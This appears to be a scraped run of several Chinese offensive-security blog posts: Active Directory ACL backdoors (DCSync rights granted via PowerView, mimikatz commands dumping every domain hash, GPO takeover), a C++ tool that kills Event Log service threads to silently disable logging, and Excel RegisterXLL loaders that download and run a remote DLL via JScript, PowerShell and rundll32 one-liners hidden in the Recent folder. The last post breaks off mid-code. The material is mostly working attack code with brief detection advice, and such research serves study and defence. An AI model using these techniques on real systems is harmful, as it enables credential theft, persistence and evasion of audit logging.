<p>通过Active Directory Service Interfaces (ADSI)实现</p>

<p>官方文档：</p>

<p>https://docs.microsoft.com/en-us/windows/desktop/AD/controlling-access-to-objects-in-active-directory-domain-services</p>

<p>Powershell调用ADSI的参考资料：</p>

<p>https://social.technet.microsoft.com/Forums/windowsserver/en-US/df3bfd33-c070-4a9c-be98-c4da6e591a0a/forum-faq-using-powershell-to-assign-permissions-on-active-directory-objects?forum=winserverpowershell</p>

<h3 id="常用命令powershell-2">常用命令(powershell)：</h3>

<p><strong>注：</strong></p>

<p>PowerView已经实现了这部分内容，所以本节直接引用PowerView中的功能</p>

<p>代码地址：</p>

<p>https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</p>

<h4 id="1获得当前域内所有对象">1、获得当前域内所有对象</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-DomainObject -Domain test.com
</code></pre></div></div>

<h4 id="2获得当前域内所有对象的acl">2、获得当前域内所有对象的ACL</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-DomainObjectAcl -Domain test.com
</code></pre></div></div>

<h4 id="3获得指定用户的acl">3、获得指定用户的ACL</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-DomainUser test1
</code></pre></div></div>

<h4 id="4添加用户test1对指定对象guid的完全访问权限">4、添加用户test1对指定对象(guid)的完全访问权限</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Add-DomainObjectAcl -TargetIdentity '483e9973-2d45-4e2f-b034-f272a26950e0' -PrincipalIdentity test1 -Rights All
</code></pre></div></div>

<h4 id="5移除用户test1对指定对象guid的完全访问权限">5、移除用户test1对指定对象(guid)的完全访问权限</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Remove-DomainObjectAcl -TargetIdentity '483e9973-2d45-4e2f-b034-f272a26950e0' -PrincipalIdentity test1 -Rights All
</code></pre></div></div>

<h3 id="利用思路-2">利用思路：</h3>

<h4 id="1dcsync后门">1、DCSync后门</h4>

<p><strong>注：</strong></p>

<p>该方法学习自：https://www.specterops.io/assets/resources/an_ace_up_the_sleeve.pdf</p>

<p>DCSync是mimikatz的一个功能，能够模拟域控制器并从域控制器导出帐户密码hash</p>

<p>如果我们在域内一台主机上获得了域管理员权限，可以使用如下命令直接导出域内所有用户的hash：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mimikatz.exe privilege::debug "lsadump::dcsync /domain:test.com /all /csv" exit
</code></pre></div></div>

<p>导出域内administrator帐户的hash：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mimikatz.exe privilege::debug "lsadump::dcsync /domain:test.com /user:administrator /csv" exit
</code></pre></div></div>

<p>默认情况下，只有<code class="language-plaintext highlighter-rouge">Domain Controllers</code>和<code class="language-plaintext highlighter-rouge">Enterprise Domain Admins</code>权限能够使用DCSync</p>

<p>但我们可以对<code class="language-plaintext highlighter-rouge">DS-Replication-GetChanges(GUID: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2)</code>和<code class="language-plaintext highlighter-rouge">DS-Replication-Get-Changes-All(1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)</code>添加ACL，这样就能实现普通用户调用DCSync导出域内所有用户的hash</p>

<p>实现代码：</p>

<p>https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1#L8270</p>

<p>添加ACL的命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Add-DomainObjectAcl -TargetIdentity "DC=test,DC=com" -PrincipalIdentity test1 -Rights DCSync
</code></pre></div></div>

<p>接下来，在域内一台登录了test1用户的主机上面，就能使用mimikatz的DCSync功能</p>

<p>删除ACL的命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Remove-DomainObjectAcl -TargetIdentity "DC=test,DC=com" -PrincipalIdentity test1 -Rights DCSync
</code></pre></div></div>

<h4 id="2gpo后门">2、GPO后门</h4>

<p>(1)查看当前域内的GPO</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Import-Module GroupPolicy
Get-GPO -All
</code></pre></div></div>

<p>如下图，<code class="language-plaintext highlighter-rouge">TestGPO</code>是我在测试环境自己添加的，<code class="language-plaintext highlighter-rouge">Default Domain Policy</code>和<code class="language-plaintext highlighter-rouge">Default Domain Controllers Policy</code>是域环境默认存在的GPO</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-12-12/4-3.png" alt="Alt text"></p>

<p>(2)添加用户test1对TestGPO的完全访问权限</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$RawObject = Get-DomainGPO -Raw -Identity 'TestGPO'
$TargetObject = $RawObject.GetDirectoryEntry()
$ACE = New-ADObjectAccessControlEntry -InheritanceType All -AccessControlType Allow -PrincipalIdentity test1 -Right AccessSystemSecurity,CreateChild,Delete,DeleteChild,DeleteTree,ExtendedRight,GenericAll,GenericExecute,GenericRead,GenericWrite,ListChildren,ListObject,ReadControl,ReadProperty,Self,Synchronize,WriteDacl,WriteOwner,WriteProperty
$TargetObject.PsBase.ObjectSecurity.AddAccessRule($ACE)
$TargetObject.PsBase.CommitChanges()
</code></pre></div></div>

<p>(3)移除用户test1对TestGPO的完全访问权限</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$RawObject = Get-DomainGPO -Raw -Identity 'TestGPO'
$TargetObject = $RawObject.GetDirectoryEntry()
$ACE = New-ADObjectAccessControlEntry -InheritanceType All -AccessControlType Allow -PrincipalIdentity test1 -Right AccessSystemSecurity,CreateChild,Delete,DeleteChild,DeleteTree,ExtendedRight,GenericAll,GenericExecute,GenericRead,GenericWrite,ListChildren,ListObject,ReadControl,ReadProperty,Self,Synchronize,WriteDacl,WriteOwner,WriteProperty
$TargetObject.PsBase.ObjectSecurity.RemoveAccessRule($ACE)
$TargetObject.PsBase.CommitChanges()
</code></pre></div></div>

<p>后续可以对GPO进行操作，添加计划任务，实现计划任务的远程执行，具体方法可参考之前的文章<a href="https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%88%A9%E7%94%A8GPO%E4%B8%AD%E7%9A%84%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C/">《域渗透——利用GPO中的计划任务实现远程执行》</a></p>

<h2 id="0x06-acl检测">0x06 ACL检测</h2>
<hr>

<h4 id="1文件和注册表">1、文件和注册表</h4>

<p>可借助开源工具WindowsDACLEnumProject：</p>

<p>https://github.com/nccgroup/WindowsDACLEnumProject</p>

<p>能够列出存在风险的ACL</p>

<h4 id="3域环境">3、域环境</h4>

<p>需要开启高级安全审核策略，参考资料：</p>

<p>https://blogs.technet.microsoft.com/canitpro/2017/03/29/step-by-step-enabling-advanced-security-audit-policy-via-ds-access/</p>

<p>开启策略后，Event ID 5136会记录域环境中ACL的修改，参考资料：</p>

<p>https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventid=5136</p>

<h2 id="0x07-小结">0x07 小结</h2>
<hr>

<p>本文介绍了Windows系统中的ACL在文件、注册表和域环境下后门利用方面的技巧，并给出检测后门的建议。</p>

<p>我从PowerView中学到了很多域环境下ACL的知识，在此感谢作者的开源。</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on December 12, 2018
  </div>

  
</article><article class="post">
  <h1>利用API NtQueryInformationThread和I_QueryTagInformation实现对Windwos日志监控的绕过</h1>

  <div class="entry">
    <hr>

<h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>在上篇文章<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E6%97%A5%E5%BF%97%E7%9A%84%E5%88%A0%E9%99%A4%E4%B8%8E%E7%BB%95%E8%BF%87/">《渗透技巧——Windows日志的删除与绕过》</a>中提到一个绕过Windows日志监控的思路：使用API NtQueryInformationThread和I_QueryTagInformation获取线程对应的服务，关闭对应日志记录功能的线程，能够破坏日志功能，并且Windows Event Log服务没有被破坏，状态仍为正在运行。本文将要对其详细介绍，分享使用c++在编写程序上需要注意的细节。</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>程序自身提权</li>
  <li>遍历进程中的所有线程</li>
  <li>根据线程tid，获取对应的进程pid</li>
  <li>根据线程tid，获取对应的服务名称</li>
  <li>结束线程</li>
</ul>

<h2 id="0x02-程序实现">0x02 程序实现</h2>
<hr>

<p>开发工具： VS2012
开发语言： c++</p>

<h3 id="1定位eventlog服务对应进程svchostexe的pid">1、定位eventlog服务对应进程svchost.exe的pid</h3>

<p>powershell代码如下：</p>

<p><code class="language-plaintext highlighter-rouge">Get-WmiObject -Class win32_service -Filter "name = 'eventlog'" | select -exp ProcessId</code></p>

<p>通过回显能够找出进程svchost.exe的pid</p>

<h3 id="2程序自身提权以管理员权限执行">2、程序自身提权，以管理员权限执行</h3>

<p>因为进程svchost.exe为系统权限，所以对其线程进行操作也需要高权限，因此，程序需要先提升至管理员权限</p>

<p>提权至管理员权限的代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>BOOL SetPrivilege()  
{  
    HANDLE hToken;   
    TOKEN_PRIVILEGES NewState;   
    LUID luidPrivilegeLUID;   
    if(!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &amp;hToken)||!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;luidPrivilegeLUID))   
    {   
        printf("SetPrivilege Error\n");  
        return FALSE;   
    }   
    NewState.PrivilegeCount = 1;   
    NewState.Privileges[0].Luid = luidPrivilegeLUID;   
    NewState.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;   
    if(!AdjustTokenPrivileges(hToken, FALSE, &amp;NewState, NULL, NULL, NULL))  
    {  
        printf("AdjustTokenPrivilege Errro\n");  
        return FALSE;  
    }  
    return TRUE;  
}  
</code></pre></div></div>

<h3 id="3遍历进程中的所有线程">3、遍历进程中的所有线程</h3>

<p>定位进程svchost.exe后，需要遍历该进程中的所有线程，然后进行筛选</p>

<p>根据进程pid遍历其子进程的代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>BOOL ListProcessThreads(DWORD pid) 
{  
    HANDLE hThreadSnap = INVALID_HANDLE_VALUE;  
    THREADENTRY32 te32;    
    hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);  
    if (hThreadSnap == INVALID_HANDLE_VALUE)  
        return(FALSE);   
    te32.dwSize = sizeof(THREADENTRY32);  
    if (!Thread32First(hThreadSnap, &amp;te32)) 
    { 
        printf("Thread32First");
        CloseHandle(hThreadSnap);   
        return(FALSE);  
    }  
    do 
    {  
        if (te32.th32OwnerProcessID == pid)
            printf("tid= %d\n",te32.th32ThreadID);             
    } while (Thread32Next(hThreadSnap, &amp;te32));  
    CloseHandle(hThreadSnap);  
    return(TRUE);  
}  
</code></pre></div></div>

<p>获取进程中的所有线程tid，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-6-25/2-1.png" alt="Alt text"></p>

<h3 id="4判断线程是否满足条件">4、判断线程是否满足条件</h3>

<p>筛选出Windows Event Log服务对应的线程，方法如下：</p>

<p>根据线程tid，获取对应的服务名称</p>

<p>可参考以下链接：</p>

<p>https://wj32.org/wp/2010/03/30/howto-use-i_querytaginformation/</p>

<p>文中提到，需要使用三个API：</p>

<p><strong>NtQueryInformationThread：</strong></p>

<ul>
  <li>来自ntdll.dll</li>
  <li>dll路径：%WinDir%\System32\</li>
</ul>

<p>使用IDA对其验证，查看ntdll.dll的导出函数，能够发现API函数NtQueryInformationThread，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-6-25/3-1.png" alt="Alt text"></p>

<p>具体使用方式：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>typedef NTSTATUS (WINAPI* FN_NtQueryInformationThread)(HANDLE, THREAD_INFORMATION_CLASS, PVOID, ULONG, PULONG);
FN_NtQueryInformationThread pfnNtQueryInformationThread = NULL;
pfnNtQueryInformationThread = (FN_NtQueryInformationThread)GetProcAddress(GetModuleHandle(_T("ntdll")), "NtQueryInformationThread");
</code></pre></div></div>

<p><strong>I_QueryTagInformation：</strong></p>

<ul>
  <li>来自advapi32.dll</li>
  <li>dll路径：%WinDir%\System32\下</li>
</ul>

<p>使用IDA对其验证，查看advapi32.dll的导出函数，能够发现API函数I_QueryTagInformation，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-6-25/3-2.png" alt="Alt text"></p>

<p>具体使用方式：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>typedef ULONG (WINAPI* FN_I_QueryTagInformation)(PVOID, SC_SERVICE_TAG_QUERY_TYPE, PSC_SERVICE_TAG_QUERY);
FN_I_QueryTagInformation pfnI_QueryTagInformation = NULL;
HMODULE advapi32 = LoadLibrary(L"advapi32.dll");
pfnI_QueryTagInformation = (FN_I_QueryTagInformation)GetProcAddress(advapi32, "I_QueryTagInformation");
</code></pre></div></div>

<p><strong>NtReadVirtualMemory：</strong></p>

<p>可使用ReadProcessMemory代替</p>

<p>更为完整的代码实例可参考如下链接：</p>

<p>http://blog.naver.com/PostView.nhn?blogId=gloryo&amp;logNo=110129121084&amp;redirect=Dlog&amp;widgetTypeCall=true</p>

<p>该文章分享了一段代码，提供进程pid和线程tid，能够获取对应的服务名称</p>

<p>当然，我们需要对该代码作改进，不需要提供进程pid，只需要线程tid就好</p>

<p>根据线程tid获取对应进程pid，代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>BOOL QueryThreadBasicInformation(HANDLE hThread)
{
    typedef NTSTATUS (WINAPI* FN_NtQueryInformationThread)(HANDLE, THREAD_INFORMATION_CLASS, PVOID, ULONG, PULONG);
    FN_NtQueryInformationThread pfnNtQueryInformationThread = NULL;
    pfnNtQueryInformationThread = (FN_NtQueryInformationThread)GetProcAddress(GetModuleHandle(_T("ntdll")), "NtQueryInformationThread");
    THREAD_BASIC_INFORMATION threadBasicInfo;
    LONG status = pfnNtQueryInformationThread(hThread, ThreadBasicInformation, &amp;threadBasicInfo,sizeof(threadBasicInfo), NULL);
    printf("process ID is %u\n",threadBasicInfo.clientId.uniqueProcess); 
    printf("Thread ID is %u\n",threadBasicInfo.clientId.uniqueThread); 

    return TRUE;
}
</code></pre></div></div>

<p>测试程序能够通过tid获取相关进程pid，运行如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-6-25/3-3.png" alt="Alt text"></p>

<p>至此，我们能够根据提供的线程tid判断出对应的进程pid和服务名称</p>

<p>接着，需要添加判断功能，筛选出eventlog服务，进行下一步操作：结束线程</p>

<h3 id="5结束线程">5、结束线程</h3>

<p>同结束进程类似，需要提供进程tid，代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>void TerminateEventlogThread(DWORD tid)
{
    HANDLE hThread = OpenThread(0x0001,FALSE,tid);
    if(TerminateThread(hThread,0)==0)
        printf("--&gt; Error !\n");
    else
        printf("--&gt; Success !\n");
    CloseHandle(hThread);
}
</code></pre></div></div>

<p>综上，将所有功能集成到一个程序中，使用时只需要提供进程svchost.exe的pid就好</p>

<p><strong>完整源代码下载地址：</strong></p>

<p>https://github.com/3gstudent/Windwos-EventLog-Bypass/blob/master/WindowsEventLogBypass.cpp</p>

<h2 id="0x03-实际测试">0x03 实际测试</h2>
<hr>

<p>获取进程svchost.exe的pid：</p>

<p><code class="language-plaintext highlighter-rouge">Get-WmiObject -Class win32_service -Filter "name = 'eventlog'" | select -exp ProcessId</code></p>

<p>获得pid为916</p>

<p>运行WindowsEventLogBypass.exe，添加pid</p>

<p>参数如下：</p>

<p><code class="language-plaintext highlighter-rouge">WindowsEventLogBypass.exe 916</code></p>

<p>实际测试，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-6-25/4-1.png" alt="Alt text"></p>

<p>成功结束线程，日志功能失效，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-6-25/4-2.png" alt="Alt text"></p>

<h2 id="0x04-小结">0x04 小结</h2>
<hr>

<p>本文介绍了使用c++编写程序绕过Windows日志的技巧，同Halil Dalabasmaz@hlldz分享的Powershell工程Invoke-Phant0m结合学习，希望能够帮助大家更好的了解这项技术。</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on June 25, 2017
  </div>

  
</article><article class="post">
  <h1>Use Excel.Application object's RegisterXLL() method to load dll</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>Ryan Hanson‏@ryHanson最近分享了一个技巧，利用<code class="language-plaintext highlighter-rouge">Excel.Application object's RegisterXLL()</code>能够加载dll。我对其分享的POC作了测试，接着做了扩展，添加功能实现远程下载执行，并且分析该方法相关的利用技巧，详细介绍脚本开发中的细节。</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍如下内容：</p>

<ul>
  <li>POC测试</li>
  <li>添加功能实现远程下载执行</li>
  <li>扩展用法1：通过powershell实现</li>
  <li>扩展用法2：结合rundll32使用</li>
</ul>

<h2 id="0x02-poc测试">0x02 POC测试</h2>
<hr>

<p><strong>POC地址如下：</strong></p>

<p>https://gist.github.com/ryhanson/227229866af52e2d963cf941af135a52</p>

<p>前提是系统已安装Microsoft Office软件，共提供三种利用方式</p>

<h3 id="1rundll32">1.rundll32</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";x=new%20ActiveXObject('Excel.Application');x.RegisterXLL('C:\\test\\messagebox.dll');this.close();
</code></pre></div></div>

<h3 id="2js">2.js</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>var excel = new ActiveXObject("Excel.Application");
excel.RegisterXLL("C:\\test\\messagebox.dll");
</code></pre></div></div>

<h3 id="3powershell">3.powershell</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$excel = [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application"))
$excel.RegisterXLL("C:\test\messagebox.dll")
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>测试的messagebox.dll来自于：https://github.com/3gstudent/test/blob/master/msg.dll</p>

<p>大小3kb，源代码及编译方法可参照文章<a href="https://3gstudent.github.io/3gstudent.github.io/Use-Office-to-maintain-persistence/">《Use Office to maintain persistence》</a></p>

<h2 id="0x03-添加功能">0x03 添加功能</h2>
<hr>

<h3 id="jscript基础知识">Jscript基础知识：</h3>

<p><strong>1、输出内容</strong></p>

<p>js代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>WScript.Echo("1");
</code></pre></div></div>

<p>直接执行js脚本会弹框</p>

<p>cmd执行：<code class="language-plaintext highlighter-rouge">cscript.exe msg.js</code>，控制台输出1</p>

<p><strong>2、特殊目录</strong></p>

<p>输出当前用户的临时目录：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>WScript.Echo(WScript.CreateObject("WScript.Shell").Environment("USER")("TEMP"));
</code></pre></div></div>

<p>输出Recent目录：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>WScript.Echo(WScript.CreateObject("WScript.Shell").SpecialFolders("Recent");
</code></pre></div></div>

<p>即<code class="language-plaintext highlighter-rouge">%AppData%\Microsoft\Windows\Recent</code>（该目录后文会用到）</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-20/2-1.png" alt="Alt text"></p>

<p>添加文件名并输出：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>WScript.Echo(WScript.CreateObject("WScript.Shell").SpecialFolders("Recent")+"\\msg.dll");
</code></pre></div></div>

<h3 id="对原poc添加功能">对原POC添加功能：</h3>

<p><strong>1、判断是否安装Microsoft Office</strong></p>

<p>通过判断是否存在Microsoft Office默认安装文件夹实现</p>

<p>查找文件夹：</p>

<p><code class="language-plaintext highlighter-rouge">"c:\Program Files\Microsoft Office"</code></p>

<p>对应js代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>var FileSys = WScript.CreateObject("Scripting.FileSystemObject");   
if (FileSys.FolderExists("c:\\Program Files\\Microsoft Office"))   
{   
	WScript.Echo("[+] Find Microsoft Office.");   
}
else
{
	WScript.Echo("[!] I can't find Microsoft Office!");    
}
</code></pre></div></div>

<p><strong>2、从Github下载dll文件并保存至Recent目录</strong></p>

<p><strong>方式1:</strong> 使用Msxml2.XMLHTTP</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>var sGet=new ActiveXObject("ADODB.Stream");
var xGet=null;
xGet=new ActiveXObject("Msxml2.XMLHTTP");
xGet.Open("GET","https://raw.githubusercontent.com/3gstudent/test/master/calc.dll",0);
xGet.Send();
sGet.Type=1;
sGet.Open();
sGet.Write(xGet.ResponseBody);
sGet.SaveToFile((WScript.CreateObject("WScript.Shell").SpecialFolders("Recent")+"\\calc.dll"),2);
</code></pre></div></div>

<p><strong>方式2:</strong> 使用WinHttp.WinHttpRequest.5.1</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>h=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
h.Open("GET","https://raw.githubusercontent.com/3gstudent/test/master/calc.dll",false);
h.Send();
s=new ActiveXObject("ADODB.Stream");
s.Type=1;
s.Open();
s.Write(h.ResponseBody);
x=new ActiveXObject("WScript.Shell").SpecialFolders("Recent")+"\\calc.dll";
s.SaveToFile(x，2);
</code></pre></div></div>

<p>两种js方式均可以，但是在rundll32下使用的话，需要使用方式2，原因如下：</p>

<p>不支持<code class="language-plaintext highlighter-rouge">WScript.CreateObject("WScript.Shell")</code>，需要换成<code class="language-plaintext highlighter-rouge">new%20ActiveXObject("WScript.Shell")</code></p>

<p>cmd执行：</p>

<p><code class="language-plaintext highlighter-rouge">rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";xGet=new%20ActiveXObject("Msxml2.XMLHTTP");xGet.Open("GET","https://raw.githubusercontent.com/3gstudent/test/master/calc.dll",0);xGet.Send();</code></p>

<p>提示权限不够，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-20/2-2.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p>选择保存在Recent目录是为了提高隐蔽性</p>

<p>保存在Recent目录，通过explorer.exe无法查看下载的dll，详情如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/ExcelDllLoader/master/1.gif" alt="Alt text"></p>

<p>但在cmd下能够查看下载的dll，详情如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/ExcelDllLoader/master/3.png" alt="Alt text"></p>

<p>在其他目录不存在这个问题，详情如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/ExcelDllLoader/master/2.gif" alt="Alt text"></p>

<p>为保证js和rundll32利用代码格式对应，原js代码作相应优化，最终代码为：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>FileSys = WScript.CreateObject("Scripting.FileSystemObject");   
if (FileSys.FolderExists("c:\\Program Files\\Microsoft Office"))   
{   
	WScript.Echo("[+] Find Microsoft Office."); 
	WScript.Echo("[+] Download file...");
	h=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
	h.Open("GET","https://raw.githubusercontent.com/3gstudent/test/master/calc.dll",false);
	h.Send();
	s=new ActiveXObject("ADODB.Stream");
	s.Type=1;
	s.Open();
	s.Write(h.ResponseBody);
	x=new ActiveXObject("WScript.Shell").SpecialFolders("Recent")+"\\calc.dll";
	s.SaveToFile(x,2);

	WScript.Echo("[+] Download Success.");
	WScript.Echo("[+] Load dll...");	 
	e= new ActiveXObject("Excel.Application");
	e.RegisterXLL(x);
	WScript.Echo("[+] Load dll Success.");	  
}
else
{
	WScript.Echo("[!] I can't find Microsoft Office!");  	   
}
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>相关代码已上传至Github，完整POC可参照：</p>

<p>https://github.com/3gstudent/ExcelDllLoader</p>

<h2 id="0x04-扩展用法">0x04 扩展用法</h2>
<hr>

<h3 id="1通过powershell实现">1、通过powershell实现</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$path=$env:APPDATA+"\Microsoft\Windows\Recent\calc.dll"
$client = new-object System.Net.WebClient
$client.DownloadFile('https://raw.githubusercontent.com/3gstudent/test/master/calc.dll', $path)
$excel = [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application"))
$excel.RegisterXLL($path)
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>该代码缺少判断MicrosoftOffice是否安装的功能</p>

<h3 id="2结合rundll32使用">2、结合rundll32使用</h3>

<p>需要注意如下细节：</p>

<ul>
  <li>空格用%20表示</li>
  <li>为避免执行后弹框，需要加入语句document.write();</li>
</ul>

<p>否则，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-20/2-22.png" alt="Alt text"></p>

<p>使用ADODB.Stream保存文件，会报错,测试代码如下：</p>

<p><code class="language-plaintext highlighter-rouge">rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","https://raw.githubusercontent.com/3gstudent/test/master/calc.dll",false);h.Send();s=new%20ActiveXObject("ADODB.Stream");s.Type=1;s.Open();s.Write(h.ResponseBody);x=new%20ActiveXObject("WScript.Shell").SpecialFolders("Recent")+"\\calc.dll";s.SaveToFile(x,2);</code></p>

<p>提示因为安全设置导致无法保存文件，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-20/2-3.png" alt="Alt text"></p>

<p>换用Scripting.FileSystemObject，能够保存文本文件，但是不支持二进制文件</p>

<p>保存文本文件,测试代码如下：</p>

<p><code class="language-plaintext highlighter-rouge">rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","https://raw.githubusercontent.com/3gstudent/test/master/version.txt",false);h.Send();s=new%20ActiveXObject("Scripting.FileSystemObject");f=s.CreateTextFile("c:\\test\\1.txt",true);f.WriteLine(h.ResponseText);f.Close();</code></p>

<p>保存二进制文件，测试代码如下：</p>

<p><code class="language-plaintext highlighter-rouge">rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","https://raw.githubusercontent.com/3gstudent/test/master/calc.dll",false);h.Send();s=new%20ActiveXObject("Scripting.FileSystemObject");f=s.CreateTextFile("c:\\test\\1.txt",true);f.WriteLine(h.ResponseText);f.Close();</code></p>

<p>报错，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-20/2-4.png" alt="Alt text"></p>

<p><strong>解决方法：</strong></p>

<p>将二进制文件作base64编码并保存成文本文件，再通过Scripting.FileSystemObject保存</p>

<p>对calc.dll作base64编码并保存至文件buffer.txt,对应powershell代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$fileContent = [System.IO.File]::ReadAllBytes('calc.dll')
$fileContentEncoded = [System.Convert]::ToBase64String($fileContent)| set-content ("buffer.txt") 
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>读取二进制文件，不能使用命令Get-content</p>

<p>将buffer.txt上传至github</p>

<p>下载base64并保存文件对应的js代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>h=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
h.Open("GET","https://raw.githubusercontent.com/3gstudent/test/master/calcbase64.txt",false);
h.Send();
fso1=new ActiveXObject("Scripting.FileSystemObject");
f=fso1.CreateTextFile("c:\\test\\1.txt",true);
f.WriteLine(h.ResponseText);
f.Close();
</code></pre></div></div>

<p>下载base64并保存文件对应rundll32的代码如下：</p>

<p><code class="language-plaintext highlighter-rouge">rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","https://raw.githubusercontent.com/3gstudent/test/master/calcbase64.txt",false);h.Send();s=new%20ActiveXObject("Scripting.FileSystemObject");f=s.CreateTextFile("c:\\test\\1.txt",true);f.WriteLine(h.ResponseText);f.Close();</code></p>

<p>文件保存成功，该文件存储base64加密后的calc.dll</p>

<p>base64解密该文件并加载dll对应的js代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>x="c:\\test\\calc.dll";
h=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
h.Open("GET","https://raw.githubusercontent.com/3gstudent/test/master/calcbase64.txt",false);
h.Send();
var enc = new ActiveXObject("System.Text.ASCIIEncoding");
